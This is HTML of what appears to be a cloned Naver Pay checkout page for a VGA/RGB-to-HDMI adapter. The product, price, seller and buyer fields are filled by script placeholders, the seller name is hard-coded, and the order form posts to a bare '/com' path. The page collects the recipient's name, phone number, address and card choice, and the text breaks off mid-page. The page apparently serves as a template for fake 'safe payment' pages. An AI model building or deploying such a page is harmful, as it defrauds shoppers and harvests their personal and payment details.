class="gnb_input_check" value=""> <label for="nsvc_terms">지식백과</label></li><li><input type="checkbox" id="nsvc_book" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_book">책</label></li><li><input type="checkbox" id="nsvc_cafe" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_cafe">카페</label></li><li><input type="checkbox" id="nsvc_calendar" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_calendar">캘린더</label></li><li><input type="checkbox" id="nsvc_navertv" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_navertv">네이버TV</label></li></ul></div><div class="svc_lst2"><div class="svc_spc gnb_first"><strong><a href="https://dict.naver.com/">어학사전</a></strong><ul class=""><li><input type="checkbox" id="nsvc_krdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_krdic">국어사전</label></li><li><input type="checkbox" id="nsvc_endic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_endic">영어/영영사전</label></li><li><input type="checkbox" id="nsvc_hanja" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_hanja">한자사전</label></li><li><input type="checkbox" id="nsvc_jpdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_jpdic">일어사전</label></li><li><input type="checkbox" id="nsvc_cndic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_cndic">중국어사전</label></li><li><input type="checkbox" id="nsvc_frdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_frdic">프랑스어사전</label></li><li><input type="checkbox" id="nsvc_dedic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_dedic">독일어사전</label></li><li><input type="checkbox" id="nsvc_rudic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_rudic">러시아어사전</label></li><li><input type="checkbox" id="nsvc_vndic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_vndic">베트남어사전</label></li><li><input type="checkbox" id="nsvc_spdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_spdic">스페인어사전</label></li><li><input type="checkbox" id="nsvc_papago" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_papago">파파고</label></li></ul></div><div class="svc_spc"><strong>인기/신규서비스</strong><ul class=""><li><input type="checkbox" id="nsvc_grafolio" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_grafolio">그라폴리오</label></li><li><input type="checkbox" id="nsvc_post" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_post">포스트</label></li><li><input type="checkbox" id="nsvc_band" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_band">밴드</label></li><li><input type="checkbox" id="nsvc_line" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_line">라인</label></li><li class="gnb_event"><input type="checkbox" id="nsvc_vibe" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_vibe">VIBE<em class="ic_gnb_new">New</em></label></li><li><input type="checkbox" id="nsvc_pcontents" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_pcontents">프리미엄콘텐츠</label></li></ul></div></div></div><div class="svc_btnwrp"><div class="svc_btns"><button class="gnb_save" onclick="if(gnbFavorite.addService()){gnbMoreLayer.clickToggleWhole()} return false;"><strong class="blind">확인</strong></button><button class="gnb_close" onclick="gnbFavorite.cancel(); return false;"><span class="blind">취소</span></button><button class="gnb_return" onclick="gnbFavorite.resetService(); return false;"><span class="blind">초기 설정으로 변경</span></button></div></div><div class="gnb_bg_btm"></div></div></div><iframe id="gnb_service_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="display:none;top:34px;right:297px;width:585px;height:385px;opacity:0;-ms-filter:alpha(opacity=0)"></iframe><iframe id="gnb_svc_more_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="display:none;top:34px;right:-4px;width:295px;height:385px;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li></ul></div>
							<script type="text/javascript" charset="utf-8" src="http://static.nid.naver.com/template/gnb_utf8.nhn?2022031303"></script>
							<!-- //GNB -->
						</div>
					</div>
			<!--    소개     -->
			<!--  마이페이지 -->
			
			<!--  결제내역  -->
			<!--  포인트  -->
			<!--  송금    -->
			<!--  선물함    -->
			<!--  판매·정산  -->
			<!-- 이벤트·쿠폰 -->
			<!-- 문의·리뷰 -->
			
			
					<div class="lnb_sc">
						<h1 class="sta">
							<a href="http://pay.naver.com" class="logo_naver"><span>N</span></a><!--N=a:LNB.pay-->
							<a href="http://pay.naver.com" class="logo_chkout"><span>Pay</span></a><!--N=a:LNB.pay-->
						</h1>
						<div class="lnb">
							<ul>
							<li><a href="http://order.pay.naver.com/home" class="menu1"><span>결제내역</span></a><!--N=a:LNB.order--></li>
							<li><a href="http://order.pay.naver.com/home?tabMenu=POINT_TOTAL" class="menu2"><span>포인트</span></a><!--N=a:LNB.point--></li>
							<li><a href="http://pay.naver.com/send/p/list/s" class="menu3"><span>송금</span></a><!--N=a:LNB.send--></li>
							<li><a href="http://pay.naver.com/mygift/d" class="menu8"><span>선물함</span></a><!--N=a:LNB.gift--></li>
							<li><a href="http://event2.pay.naver.com/event/benefit/list" class="menu5"><span>이벤트·쿠폰</span></a><!--N=a:LNB.event--></li>
							<li><a href="http://pay.naver.com/shoppingInquiry/inquiryList" class="menu6"><span>문의·리뷰</span></a><!--N=a:LNB
							.review--></li>
							</ul>
						</div>
					</div>		
				
					</div>
				</div> 
				<!-- //header -->
			
				<!-- container -->
				<div id="container">
					<!-- content -->
					<div id="order" class="order_sc _root _cartDiv">
			
			
			<!-- pg사별 Script -->
						
						
						
						
						
						
						
			<!-- 결제관련 공통 Script -->
				
			
			
			
			
			
			
			
			
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		   
			
			
			
			
			
			
			
			
			
			<div class="order_header">
				<h3 class="order_payment"><span class="blind">주문/결제</span></h3>
				<ol class="process">
					<li><em class="pro"><span class="blind">장바구니</span></em></li>
					<li class="on"><em class="pro2"><span class="blind">주문/결제</span></em></li>
					<li><em class="pro3"><span class="blind">주문완료</span></em></li>
				</ol>
			</div>
			
			
			
			<form id="orderForm" action="/com" name="orderForm" class="_orderForm" method="post">
				<input type="hidden" name="tempOrderId" value="">
				<input type="hidden" name="donAgree" value="false" class="_donAgree _certificationForm">
				<input type="hidden" name="billingPgId" class="_payForm">
				<input type="hidden" name="reserveSeq" value="6261708841" class="_payForm">
				<input type="hidden" name="fdsUuid" value="" class="_fdsUuid _certificationForm">
				<input type="hidden" name="naverToken" value="" class="_naverToken _certificationForm">
				<input type="hidden" name="isNaverPayPasswordAvailable" value="false" class="_certificationForm">
				<input type="hidden" name="authentificationToken" value="" class="_authentificationToken _certificationForm">
				<input type="hidden" name="mbrsSscYn" value="false" class="_certificationForm">
			
				<div class="order_content">
			<div class="product_area">
				<span class="top_line"></span>
				<table cellspacing="0" class="tb_products">
					<caption>주문내역</caption>
					<colgroup>
						<col width="500">
						<col width="135">
						<col width="120">
						<col width="90">
						<col width="110">
						<col>
					</colgroup>
					<thead class="point_plus">
					<tr>
					<th scope="col" class="product">상품정보</th>
					<th scope="col">판매자</th>
					<th scope="col">배송비</th>
					<th scope="col">수량</th>
					<th scope="col" class="bg_point">할인</th>
					<th scope="col" class="col_price">상품금액(할인포함)</th>
					</tr>
					</thead>
					<tbody>
					
			
			
			
					<tr>
						<td>
								<span class="bdr"></span>
							<div class="product_info">
								<a href="http://smartstore.naver.com/main/products/2515203719" class="product_thmb" target="_blank">
									<span class="mask"></span><img src="`+물건이미지+`" alt="RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭" width="92" height="92">
								</a><!--N=a:ord.product-->
								<div class="product_dsc">
									<div class="additional_status">
											<span class="ico_npmember type_npay small"><span class="blind">네이버플러스 멤버십</span></span>
												<span class="predict_status p_color_green">내일 도착 확률 93%</span>
									</div>
											<strong class="name_seller">`+판매자이름+`</strong>
									<a href="" target="_blank" class="product_name">
										<strong>
											`+
											물건이름 +
											`
										</strong>
									</a><!--N=a:ord.product-->
			
										<div class="option">
											<span class="ico_option"><span class="blind">옵션</span></span>
											<ul class="option_list">
													<li>
														선택: `+물건이름+`/1개 
													</li>
											</ul>
										</div>
								</div>
								<span class="vm"></span>
							</div>
						</td>
			
							<td rowspan="1">
										<a href="http://smartstore.naver.com/withit" class="seller" target="_blank" title="김민준">김민준</a><!--N=a:ord.ord.sellerstore-->
							</td>
							<td rowspan="1">
			
										<span class="deli_fee"><span class="sp_order ico_deli"></span><span class="sum _deliveryPrice2022031490319617">2500원<a href="#" class="sp_order ico_que _deliveryFeeLayerBtn2022031490319617 _click(nmp.front.order.order_sheet.showLayerDeliveryFee(2022031423515848)) _stopDefault" style="display:none;"></a><!--N=a:ord.deldetail--></span><span class="_deliveryPriceText2022031490319617"></span></span>
										<span class="sp_ico_text today"><span class="blind">오늘출발</span></span>
										<span>오늘<br>12:00까지<br>결제하면<br>오늘 바로 발송</span>
							</td>
			
						<td>1개</td>
						<td>
								<span class="discount">
									<span class="_discountAmount2022031423515848">(-) </span>
									<span class="_discountAmountText2022031423515848">
										`+String(기존가격1 - 가격1)+`원</span>
									<a href="#" class="sp_order ico_que _discountAmountLayer2022031423515848
									_click(nmp.front.order.order_sheet.showLayerDiscount(2022031423515848)) _stopDefault">
										<span class="blind _discountAmountLayer2022031423515848">할인금액 도움말</span>
									</a><!--N=a:ord.discdetail-->
								</span>
						</td>
						<td class="col_price">
							<span class="orgn_price _productOrderTotalAmt2022031423515848"><em>`+기존가격+`</em>원</span>
							<strong><em class="_productOrderPayAmt2022031423515848">`+가격+`</em>원</strong>
						</td>
					</tr>
			
			
					</tbody>
				</table>
			</div>        <div class="cutting_line">
						<span class="ico_scissors"></span>
						<span class="shdw_left"></span>
						<span class="shdw_right"></span>
					</div>
			<div class="destination_wrap">
				<div class="deliver_wrap _deliveryInfos _deliveryInfoType">
					<h4><span class="blind">배송지정보</span></h4>
			
			
						
						<div class="_allAddressArea">
							<div class="deliver_option_wrap new_delivery">
								<strong class="req short" title="필수입력">수령인</strong>
								<div class="deliver_option">
									<input type="text" title="수령인" placeholder="50자 이내로 입력하세요" maxlength="50" class="inp_txt2 name _deliveryForm" name="receiverName" value="">
									<input type="hidden" name="deliveryAddress.purchaseMemberDeliveryPlaceSeq" value="">
								</div>
							</div>
							<div class="deliver_option_wrap">
								
								<div class="deliver_option">
									<div class="comments deliver_name">
										<div class="dropdown_wrap">
											
											
			
											<div class="_delivery_place_name_list_area" style="display: none; position: absolute; width: 232px; z-index: 10000;">
												<div class="comment">
													<ul class="memo_box" style="width: auto;background-color: #fff;">
														<li><a href="#" class="sel_item _click(nmp.front.order.order_sheet.setDeliveryPlaceName(집)) _stopDefault">집</a></li>
														<li><a href="#" class="sel_item _click(nmp.front.order.order_sheet.setDeliveryPlaceName(회사)) _stopDefault">회사</a></li>
														<li><a href="#" class="sel_item _click(nmp.front.order.order_sheet.setDeliveryPlaceName(학교)) _stopDefault">학교</a></li>
														<li><a href="#" class="sel_item _click(nmp.front.order.order_sheet.setDeliveryPlaceName(친구)) _stopDefault">친구</a></li>
														<li><a href="#" class="sel_item _click(nmp.front.order.order_sheet.setDeliveryPlaceName(가족)) _stopDefault">가족</a></li>
													</ul>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="deliver_option_wrap">
								<strong class="req short" title="필수입력">연락처1</strong>
								<div class="deliver_option">
								   <div class="cellphone_group">
										<!-- select box -->
										<div class="select_section">
											<div id="cellPhone" class="">
												<select id="deliveryAddress.telNo1_1" name="phonenumber1" class="selectbox-source _deliveryForm _group_tel1_1 _change(nmp.front.order.order_sheet.checkFirstNumber(default)) _firstNumber" style="display: none;">
														<option value="010" selected="">010</option>
														<option value="011">011</option>
														<option value="016">016</option>
														<option value="017">017</option>
														<option value="018">018</option>
														<option value="019">019</option>
														<option value="02">02</option>
														<option value="031">031</option>
														<option value="032">032</option>
														<option value="033">033</option>
														<option value="041">041</option>
														<option value="042">042</option>
														<option value="043">043</option>
														<option value="044">044</option>
														<option value="051">051</option>
														<option value="052">052</option>
														<option value="053">053</option>
														<option value="054">054</option>
														<option value="055">055</option>
														<option value="061">061</option>
														<option value="062">062</option>
														<option value="063">063</option>
														<option value="064">064</option>
														<option value="070">070</option>
														<option value="080">080</option>
														<option value="0130">0130</option>
														<option value="0303">0303</option>
														<option value="0502">0502</option>
														<option value="0503">0503</option>
														<option value="0504">0504</option>
														<option value="0505">0505</option>
														<option value="0506">0506</option>
														<option value="0507">0507</option>
														<option value="0508">0508</option>
														<option value="050">050</option>
														<option value="012">012</option>
														<option value="059">059</option>
												</select>
												<div class="selectbox-box">
													<div class="selectbox-label" unselectable="on">010</div>
												</div>
												
												<span class="drop"></span>
											</div>
										</div>
										-
										<input type="text" title="핸드폰번호 중간" id="deliveryAddress.telNo1_2" name="phonenumber2" value="" class="inp_txt2 _deliveryForm _group_tel1_2 _onlyNumberTarget" maxlength="4">
										-
										<input type="text" title="핸드폰번호 뒷자리" id="deliveryAddress.telNo1_3" name="phonenumber3" value="" class="inp_txt2 _deliveryForm _group_tel1_3 _onlyNumberTarget" maxlength="4">
									</div>
										
								</div>
								<input type="hidden" id="reliefPhoneNumberHidden" class="_deliveryForm _reliefPhoneNumberUseYn" name="deliveryAddress.reliefPhoneNumberUseYn">
							</div>
							
							<div class="deliver_option_wrap deli_address">
								<strong class="req" title="필수입력">배송지 주소</strong>
								<div class="deliver_option">
									
									
									
									
									<input type="hidden" name="deliveryAddress.roadNameAddress" value="" class="_deliveryForm">
									<input type="hidden" name="deliveryAddress.lotNumberAddress" value="" class="_deliveryForm">
									<input type="hidden" name="deliveryAddress.roadNameAddressYn" value="false" class="_deliveryForm">
									<div class="addr_detail">
										<input type="text" title="주소" class="inp_txt2 addr_input1 _deliveryForm" name="baseadd" value="" maxlength="50">
										<input type="text" title="상세주소" class="inp_txt2 addr_input2 _deliveryForm" name="inadd" value="" maxlength="50">
									</div>
									<p class="lotNumberAddress">
									 </p>
								</div>
							</div>
						</div>
			
					 <div class="_deliveryMemoOuter deliver_option_wrap deli_comments">
						<strong class="_deliveryMemoHeader">배송메모</strong>
						<div class="_deliveryMemoInner deliver_option">
						
									<div class="comments deliveryMemo">
										<p class="products_tit _deliveryMemoProductName deliverySingleMemo" style="display:none;">RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭</p>
										<p class="products_tit _deliveryMemoProductName deliveryProductMemo">
											RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭(선택: 01_RGB to HDMI 젠더)
										</p>
											<div class="dropdown_wrap">
												<input type="text" placeholder="요청사항을 직접 입력합니다" title="배송 메세지" name="deliveryMemo" class="deli_msg placeholder _deliveryForm deliverySingleMemo _click(nmp.front.order.order_sheet.showLatestDeliveryMemo()) _stopDefault">
												<input type="text" placeholder="요청사항을 직접 입력합니다" title="배송 메세지" name="deliveryMemos.2022031426018307" class="deli_msg placeholder _deliveryForm particularDeliveryMemo deliveryProductMemo _click(nmp.front.order.order_sheet.showLatestDeliveryMemo(2022031426018307)) _stopDefault" style="display:none;">
												   <a href="#" title="배송메세지 선택" class="dropdown deliverySingleMemo _click(nmp.front.order.order_sheet.showLatestDeliveryMemo(,deliverySingleMemo)) _stopDefault"><span class="dropdown_arr _stopDefault"></span></a>
												   <a href="#" title="배송메세지 선택" class="dropdown deliveryProductMemo _click(nmp.front.order.order_sheet.showLatestDeliveryMemo(2022031426018307,particularDeliveryMemo)) _stopDefault" style="display:none;"><span class="dropdown_arr _stopDefault"></span></a>
											</div>
										<span class="length deliverySingleMemo"><em class="deliveryMemoRealLength">0</em>/<em class="deliveryMemoMaxLength">500</em></span>
										<span class="length deliveryProductMemo" style="display:none;"><em class="particularDeliveryMemoRealLength">0</em>/<em class="particularDeliveryMemoMaxLength">500</em></span>
									</div>
						</div>
					</div>
						<p class="extra_info">
						<span class="ico_ext"></span>도서산간 지역의 경우 추후 수령 시 추가 배송비가 과금될 수 있습니다.</p>
				</div>
				<div class="userinfo_wrap _purchaserInfo">
					<h4>주문자 정보</h4>
					<ul class="user_info">
					<li><span class="_memberEmailAddress">`+id+`</span><button class="btn _click(nmp.front.order.order_sheet.changeMemberEmail()) _stopDefault">수정</button><!--N=a:ord.modifyemail--></li>
					</ul>
					<ul class="info_dsc">
						<li class="info_confirm">
							<span class="_telNoNoti _telNoDuplicated" style="display:none"><strong>휴대폰 번호를 확인해주세요!</strong><br>현재 등록되어 있는 휴대폰 번호가<br>다른사용자에게도 동일하게 등록되어<br>있습니다.<br>휴대폰 번호가 잘못 등록되어 있을 경우<br>정확한 주문/결제 알림을 받지 못할 수<br> 있습니다.</span>
							<span class="_telNoNoti _telNoNeedRegistration" style="display:none"><strong>휴대폰 번호를 등록해주세요.</strong><br>휴대폰 번호가 등록되지 않으면 정확한<br>주문/결제 알림을 받지 못할 수 있습니다.</span>
							<span class="_telNoNoti _telNoInfo" style="display:block">주문자 정보로 결제관련 정보가 제공됩니다.<br>정확한 정보로 등록되어있는지 확인해주세요.</span>
						</li>
					</ul>
				</div>
				<span class="shdw_left"></span>
				<span class="shdw_right"></span>
			</div><input type="hidden" name="prestigeKey" value="" class="_certificationForm">
			
			
			
			
			<div class="payment_wrap">
				<div id="chargePointScrollArea" class="payment_info">
					<h4><span class="blind">결제수단</span></h4>
					<div class="payment">
			
			
			
			
			<div class="charge _changeEasyPayInfoNotice">
				<p class="txt">선택하신<a href="http://pay.naver.com/mypage/update" target="_blank" class="link">카드/계좌정보 변경은 설정</a><!--N=a:ord.setting--> 메뉴에서 하실 수 있습니다.</p>
			</div>
			
			<ul class="paymethod_list _paymentsArea" style="display: block;">
			
			
			
			<!-- 충전포인트 사용 가능한지 -->
			
			<!-- 충전포인트 영역 노출할지. -->
			
			<!-- 충포 마지막 결제 데이터가 있고 네이버 통장으로 결제 한 경우 -->
			<a id="chargePointFocusTrigger" href="#chargePointScrollArea" style="display: none;"></a>
			
			
					
			
					
			
					<li class="paymethod _payMethodTab _generalPaymentsTab">
						<div class="header">
							<span class="ajax_radio radio-applied _payMethodRadio">
								<span class="radio-mark radio-checked"></span><!--N=a:ord.paygeneral-->
								<input type="radio" name="payMethod" value="generalPayments" id="generalPaymentsRadio" class="_click(nmp.front.order.order_sheet.changePaymentTab(generalPayments)) _stopDefault">
							</span>
			
							<span class="checkbox-applied _payMethodCheckBox" style="display: none;">
								<span class="checkbox-mark _checkboxMarker _click(nmp.front.order.order_sheet.changePaymentTab(generalPayments)) _stopDefault"></span><!--N=a:ord.paygeneral-->
								<input type="radio" name="payMethod" value="generalPayments" id="generalPaymentsCheckBox" class="_click(nmp.front.order.order_sheet.changePaymentTab(generalPayments)) _stopDefault">
							</span>
			
							<label for="generalPaymentsRadio">네이버 페이 안전결제</label><!--N=a:ord.paygeneral-->
			
							<em class="_generalPaymentAmount payment_price off"></em>
						</div>
			
						<ul class="payment_list _generalPaymentsList _payMethodTabOpenArea" style="display:none;">
												<li class="payment_item">
													<span class="ajax_radio radio-applied _payMeansClassRadio">
														<span class="radio-mark _click(nmp.front.order.order_sheet.changePayment()) _radioMarker _stopDefault"></span>
														<!--N=a:ord.card-->
														<input type="radio" name="payMeansClass" id="pay0" value="CREDIT_CARD" class="opt _click(nmp.front.order.order_sheet.changePayment()) _payMeansClass" checked="checked">
													</span>
													<label for="pay0">신용카드</label>
														<!--N=a:ord.card-->
												</li>
			
			
			
												<li class="payment_item">
													<span class="ajax_radio radio-applied _payMeansClassRadio">
														<span class="radio-mark _click(nmp.front.order.order_sheet.changePayment()) _radioMarker _stopDefault"></span>
														<!--N=a:ord.cellphone-->
														<input type="radio" name="payMeansClass" id="pay3" value="MOBILE" class="opt _click(nmp.front.order.order_sheet.changePayment()) _payMeansClass" checked="checked">
													</span>
													<label for="pay3">휴대폰</label>
														<!--N=a:ord.cellphone-->
												</li>
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
										<li class="payment_item tooltip_area">
											<span class="ajax_radio radio-applied _payMeansClassRadio _payMeanSkip"><span class="radio-mark _payMeanSkipEvent _click(nmp.front.order.order_sheet.changePayment()) _radioMarker _stopDefault"></span>
												<!--N=a:ord.deposit-->
												<input type="radio" name="payMeansClass" id="pay20" value="SKIP" class="opt _click(nmp.front.order.order_sheet.changePayment()) _payMeansClass _payMeanSkipInput">
											</span>
											<label for="pay20" class="_payMeanSkipLabel">나중에 결제
												<button type="button" class="sp_order ico_que _payMeanSkipGuide _click(nmp.front.order.order_sheet.showLayerPayNextGuide(false)) _stopDefault" title="?">
													<span class="blind">도움말</span>
												</button><!--N=a:ord.plmean-->
											</label>
												<!--N=a:ord.deposit-->
											<span class="tooltip type_small _payMeanSkipTooltip">주문 먼저하고<span class="tooltip_arrow type_down"></span></span>
										</li>
			
			
								<li class="payment_item" style="display:none;"><span class="_payMeansClassRadio radio-applied"><span class="radio-mark _click(nmp.front.order.order_sheet.changePayment() _radioMarker) radio-checked"></span><input type="radio" name="payMeansClass" value="POINT" class="opt _click(nmp.front.order.order_sheet.changePayment()) _payMeansClass" style="display: none;"></span></li>
						</ul>
			
			
			<div class="commonBannerArea">
			
									<div class="banner_text _membershipPlccTextBanner _creditCard_commonBanner" style="display: none">
										<a href="http://campaign.naver.com/naverhyundaicard/??eventCode=NAV04&amp;redirect_Url1=http://order.pay.naver.com/orderSheet/b78c81ab-8b44-486f-a3da-75000ef66b86/integrationCart?backUrl=http%3A%2F%2Fsmartstore.naver.com%2Fwithit%2Fproducts%2F2515203719" class="N=a:ord.nhdcorderapply2 link">
											<span class="ico_npmember"><span class="blind">네이버플러스 멤버십</span></span>
											<strong class="point_color_blue2">최대 10% 적립, 네이버 현대카드</strong> 혜택 받기
										</a><!--N=a:ord.nhdcorderapply2-->
									</div>
			</div>
			
			
			
			
					</li>
			</ul>
			<div class="detail">
				<div class="benefit_info _cardBenefitInfo" style="display:none;">
					<strong class="benefit_tit">결제/할인혜택 안내 <span class="ico_bar"></span></strong>
					<div class="benefit_detail _creditCardInstallmentArea" style="display: none;">
						<ul class="detail_list">
							<!-- 무이자 할부 관련 설정 정보 -->
							<input type="hidden" class="_freeInterestInstallmentApplyYn _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestInstallmentApplyYn">
							<input type="hidden" class="_freeInterestInstallmentBrdnCoreTypeCode _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestInstallmentBrdnCoreTypeCode">
							<input type="hidden" class="_freeInterestInstallmentSellerCommissionRate _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestInstallmentSellerCommissionRate">
							<input type="hidden" class="_freeInterestCommissionAmt _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestCommissionAmt">
							<input type="hidden" class="_partFreeInterestBurdenMonths _payForm _freeInterestField" name="freeInterestInstallmentInfo.partFreeInterestBurdenMonths">
							<input type="hidden" class="_freeInterestMiniminApplyAmount _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestMiniminApplyAmount">
							<input type="hidden" class="_cardInstallmentTypeCode _payForm _freeInterestField" name="cardSettleInfo.cardInstallmentTypeCode">
							<input type="hidden" class="_freeInterestInstallmentType _payForm _freeInterestField" name="freeInterestInstallmentInfo.freeInterestInstallmentType" value="NON_INSTALLMENT">
							<li><em class="highlight _noInstallmentMonthStr"></em></li>
							<li><em class="highlight _eventInfoStr"></em></li>
							<li class="_companycard_notice" style="display:none;"><em class="highlight">법인(개인사업자 법인 포함)카드는 할부/무이자혜택 적용 불가</em></li>
						</ul>
					</div>
				</div>
			</div>
			
			<ul class="paymethod_list _noPaymentArea _click(nmp.front.order.order_sheet.showNoPaymentLayer()) _stopDefault" style="display:none;">
			
				<li class="paymethod">
					<div class="header">
						<span class="ajax_radio radio-applied radio-disabled">
							<span class="radio-mark"></span>
							<input type="radio" name="purpose" id="purpose1" disabled="">
						</span>
			
						<label for="purpose1">포인트 충전결제</label>
					</div>
				</li>
			
				<li class="paymethod">
					<div class="header">
						<span class="ajax_radio radio-applied radio-disabled">
							<span class="radio-mark"></span>
							<input type="radio" name="purpose" id="purpose1" disabled="">
						</span>
						<label for="purpose1">계좌 간편결제</label>
					</div>
				</li>
				<li class="paymethod">
					<div class="header">
						<span class="ajax_radio radio-applied radio-disabled">
							<span class="radio-mark"></span>
							<input type="radio" name="purpose" id="purpose1" disabled="">
						</span>
						<label for="purpose1">카드 간편결제</label>
					</div>
				</li>
				<li class="paymethod">
					<div class="header">
						<span class="ajax_radio radio-applied radio-disabled">
							<span class="radio-mark"></span>
							<input type="radio" name="purpose" id="purpose1" disabled="">
						</span>
						<label for="purpose1">일반결제</label>
					</div>
				</li>
			</ul><!--N=a:ord.paymentdimm-->
			<input type="hidden" name="defaultEasyCardCode" value="">
			<input type="hidden" name="totalReviewMileage" value="0">
						<div class="_paymentsArea" style="display: block;">
			<div class="_generalPayments _paymentsTab" style="display:none;">
				<div class="creditCard _tr_paymeans _accountInfo" style="display: none;">
					<div class="payment_option_wrap">
						<strong class="req short">카드구분</strong>
						<div class="payment_option">
							<ul class="radio_inline_list">
								<li><span class="_cardTypeRadio radio-applied"><span class="radio-mark _click(nmp.front.order.order_sheet.integration_cart.changeCardType()) radio-checked"></span><input type="radio" id="card" name="cardType" value="PRIVATE" class="_cardtype _payForm _click(nmp.front.order.order_sheet.integration_cart.changeCardType())" checked=""></span> <label for="card">개인카드</label></li>
								<li><span class="_cardTypeRadio radio-applied"><span class="radio-mark _click(nmp.front.order.order_sheet.integration_cart.changeCardType())"></span><input type="radio" id="card2" name="cardType" value="CORPORATION" class="_cardtype _payForm _click(nmp.front.order.order_sheet.integration_cart.changeCardType())"></span> <label for="card2">법인카드</label></li>
							</ul>
						</div>
					</div>
					<div class="payment_option_wrap">
						<strong class="req short">카드선택</strong>
						<div class="payment_option credit_option">
							<div class="select_section">
								<div id="cardCodeList" class="">
									<select title="카드종류" id="card_li" name="cardSettleInfo.cardCompanyTypeCode" class="selectbox-source cardCompanyTypeCode _payForm _tr_paymeans _change(nmp.front.order.order_sheet.integration_cart.changeCompanyTypeCode())" style="display: none;">
										<option class="selectbox-default _selectBoxDefault" value="">선택해주세요.</option>
										<option value="C3">국민</option>
										<option value="C1">비씨</option>
										<option value="C0">신한</option>
										<option value="CH">현대</option>
										<option value="C7">삼성</option>
										<option value="C5">롯데</option>
										<option value="CA">외환</option>
										<option value="C4">NH</option>
										<option value="CF">하나</option>
										<option value="CB">우리</option>
										<option value="C2">광주</option>
										<option value="C8">수협</option>
										<option value="C9">씨티</option>
										<option value="CC">전북</option>
										<option value="CD">제주</option>
										<option value="CP">카카오뱅크</option>
										<option value="CQ">케이뱅크</option>
										<option value="CR">UnionPay(銀聯)/해외발급</option>
									</select>
									<div class="selectbox-box">
										<div class="selectbox-label" unselectable="on">선택해주세요.</div>
									</div>
									
									<span class="drop"></span>
								</div>
							</div>
							<p class="dsc _eventInfoStr"></p>
						</div>
					</div>
					<div class="payment_option_wrap">
						<strong class="req short">할부기간</strong>
						<div class="payment_option credit_option">
							<!-- select box -->
							<div class="select_section">
								<div id="installmentCodeList" class="selectbox-disabled">
									<select id="monthGeneralPay" name="freeInterestInstallmentInfo.installmentMonth" class="selectbox-source cardInstallmentPeriodClassCode _payForm _change(nmp.front.order.order_sheet.integration_cart.changeInstallment())" disabled="" style="display: none;">
										<option class="selectbox-default _selectBoxDefault" value="">선택해주세요.</option>
										<option value="01">일시불</option>
										<option value="02">2개월</option>
										<option value="03">3개월</option>
										<option value="04">4개월</option>
										<option value="05">5개월</option>
										<option value="06">6개월</option>
										<option value="07">7개월</option>
										<option value="08">8개월</option>
										<option value="09">9개월</option>
										<option value="10">10개월</option>
										<option value="11">11개월</option>
										<option value="12">12개월</option>
										<option value="18" style="display:none;">18개월</option>
										<option value="24" style="display:none;">24개월</option>
										<option value="36" style="display:none;">36개월</option>
									</select>
									<div class="selectbox-box">
										<div class="selectbox-label" unselectable="on">일시불</div>
									</div>
									
									<span class="drop"></span>
								</div>
							</div>
							<p class="dsc _noInstallmentStr"></p>
							<p class="dsc dsc_block _bccard_notice" style="display:none;"><em class="highlight">카드에 BC마크가 없는 경우 무이자 할부 적용 불가</em></p>
							<p class="dsc dsc_block"><em class="highlight _noInstallmentMonthStr"></em></p>
							<p class="dsc dsc_block"><em class="highlight _eventInfoStr"></em></p>
							<p class="dsc dsc_block _companycard_notice" style="display:none;"><em class="highlight">법인(개인사업자 법인 포함)카드는 할부/무이자혜택 적용 불가</em></p>
							<p class="dsc highlight _unionpay_notice" style="display:none;">국내(한국) 발급 카드는 결제 불가능합니다. 해당 카드사 선택하여 진행 부탁드립니다.<br>本交易不支持银联在线支付，请选择韩国发卡行提供的线上支付工具。</p>
			
						</div>
					</div>
				</div>
				<div class="bank _tr_paymeans _accountInfo" style="display: none">
				</div>
			<div class="skip _tr_paymeans _accountInfo _skipTemplate" style="display: none">
				
				<div class="payment_option_wrap">
					<strong class="req short">결제구분</strong>
					<div class="payment_option credit_option">
						<div class="select_section">
							<div id="skipPaymentMethodSelectBox" class="">
								<select class="selectbox-source _change(nmp.front.order.order_sheet.changePayNextType()) _stopDefault" style="display: none;">
											<option value="BANK">나중에 계좌 결제</option>
											<option value="CREDIT_CARD">나중에 카드 결제</option>
										<option value="VIRTUAL_ACCOUNT">나중에 무통장 입금</option>
								</select>
								<div class="selectbox-box">
									<div class="selectbox-label" unselectable="on">나중에 계좌 결제</div><!--N=a:ord.ploption-->
								</div>
								
								<span class="drop"></span>
							</div>
						</div>
					</div>
				</div>
			
				<ul class="info_area _skipBankInfo _skipPayMethodInfo" style="display:none;">
					<li>
						<strong>지금 즉시 결제하지 않아도 됩니다!</strong>
